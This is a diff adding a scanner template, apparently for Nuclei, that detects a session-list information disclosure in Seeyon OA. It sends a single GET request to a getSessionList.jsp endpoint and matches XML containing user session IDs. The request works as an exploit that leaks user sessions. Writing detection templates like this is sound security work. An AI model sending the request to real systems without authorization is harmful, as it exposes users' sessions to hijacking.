@@ -1,0 +1,31 @@
+id: seeyon-oa-session-information-disclosure
+
+info:
+  name: 致远oa用户session信息泄露
+  author: Master先生
+  severity: medium
+  reference:
+    - https://blog.csdn.net/xd_2021/article/details/122232463
+  tags: seeyon,information,disclosure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<?xml version="
+          - "<SessionList>"
+          - "<Session>"
+          - "</usrID>"
+        part: body
+        condition: and
